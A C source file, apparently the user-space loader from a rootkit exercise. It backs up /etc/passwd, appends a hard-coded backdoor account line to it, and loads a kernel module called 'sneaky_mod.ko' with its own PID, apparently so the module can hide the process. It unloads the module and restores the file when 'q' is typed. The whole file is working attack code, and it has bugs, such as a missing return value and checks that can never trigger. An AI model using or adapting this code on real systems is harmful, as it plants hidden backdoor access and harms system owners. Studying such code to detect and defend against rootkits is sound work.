#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#define REAL_PWD "/etc/passwd"
#define FAKE_PWD "/tmp/passwd"
#define SNEAKY_USER "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash"

int replace_pwd() {
  char read_buf[10000];
  size_t byte_read;
  size_t byte_write;
  int real_pwd = open(REAL_PWD, O_RDONLY);
  int fake_pwd = open(FAKE_PWD, O_CREAT | O_WRONLY | O_TRUNC, 0600);

  if (real_pwd < 0 || fake_pwd < 0) {
    printf(
        "sneaky_process failed to open real_pwd /& fake_pwd,error number:%d\n",
        errno);
    return -1;
  }

  while (1) {
    byte_read = read(real_pwd, read_buf, sizeof(read_buf));

    if ((int)byte_read < 0) {
      printf("REPLACE_PWD:byte_read < 0,read error!\n");
      return -1;
    } else if (byte_read == 0) {
      break; // end of reading,break while loop
    }

    byte_write = write(fake_pwd, read_buf, byte_read);

    if (byte_write < 0) {
      printf("REPLACE_PWD:sneaky_process failed to write\n");
      return -1;
    }
  }

  if (close(real_pwd) < 0 || close(fake_pwd)) {
    perror("real_pwd /& fake_pwd failed to close");
  }
  // add newline for desired user

  FILE *etc_file = fopen(REAL_PWD, "a"); // append to the end of current file
  if (etc_file == NULL) {
    perror(" failed to open etc_file");
  } else {
    fprintf(etc_file, "%s\n", SNEAKY_USER);
  }
  if (fclose(etc_file) != 0) {
    perror("failed to close etc_file");
  }
  return 0;
}

int restore_pwd() {
  char read_buf[10000];
  size_t byte_read;
  size_t byte_write;
  int real_pwd = open(FAKE_PWD, O_RDONLY);
  int fake_pwd = open(REAL_PWD, O_CREAT | O_WRONLY | O_TRUNC, 0600);

  if (real_pwd < 0 || fake_pwd < 0) {
    printf("RESTORE_PWD:sneaky_process failed to open real_pwd /& "
           "fake_pwd,error number:%d\n",
           errno);
    return -1;
  }

  while (1) {
    byte_read = read(real_pwd, read_buf, sizeof(read_buf));

    if ((int)byte_read < 0) {
      printf("RESOTRE_PWD:byte_read < 0,read error!\n");
      return -1;
    } else if (byte_read == 0) {
      break; // end of reading,break while loop
    }

    byte_write = write(fake_pwd, read_buf, byte_read);

    if (byte_write < 0) {
      printf("RESOTRE_PWD:sneaky_process failed to write\n");
      return -1;
    }
  }
}

int insert_module(char *sneaky_id) {

  char *arguments[4];
  printf("start to insert! sneaky_id is %s\n", sneaky_id);
  arguments[0] = "insmod";
  arguments[1] = "sneaky_mod.ko";
  arguments[2] = sneaky_id;
  arguments[3] = NULL;
  return execvp(arguments[0], arguments);
}

int remove_module() {
  char *arguments[3];
  arguments[0] = "rmmod";
  arguments[1] = "sneaky_mod.ko";
  arguments[2] = NULL;

  pid_t pid = fork();
  int status;
  if (pid == -1) {
    printf("REMOVE_MODULE:can't fork,error occured\n");
    exit(EXIT_FAILURE);
  } else if (pid == 0) { // child

    if (execvp(arguments[0], arguments) < 0) {
      perror("failed to remove module\n");
    }
  } else { // parent
    printf("REMOVE_MODULE:parent process,pid = %u\n", getpid());
    pid_t parent;
    if ((parent = waitpid(pid, &status, 0)) <= 0) {
      printf("waitpid() failed\n");
    }
  }
  return 0;
}

int main(int argc, char *argv[]) {
  printf("sneaky_process pid = %d\n", getpid());
  replace_pwd(); // copy the /etc/passwd file to /tmp/passwd
  printf("after replace_pwd()\n");
  char sneaky_pid[64];
  memset(sneaky_pid, 0, sizeof(sneaky_pid));

  snprintf(sneaky_pid, sizeof(sneaky_pid), "sneaky_pid=%d", getpid());
  printf("sneaky_pid is %s\n", sneaky_pid);
  pid_t pid = fork();
  int status;
  if (pid == -1) {
    printf("can't fork,error occured\n");
    exit(EXIT_FAILURE);
  } else if (pid == 0) { // child

    if (insert_module(sneaky_pid) < 0) {
      perror("failed to insert module\n");
    } else {
      printf("insert succeed\n");
    }
  } else { // parent
    printf("parent process,pid = %u\n", getpid());
    pid_t parent;
    if ((parent = waitpid(pid, &status, 0)) <= 0) {
      printf("waitpid() failed\n");
    }
  }
  printf("come into loop ....\n");
  while (1) {
    if (getchar() == 'q') {
      if (remove_module() != 0) {
        perror("Oh,failed to remove sneaky module!\n");
      } else {
        restore_pwd();
        break;
      }
    }
  }

  return EXIT_SUCCESS;
}
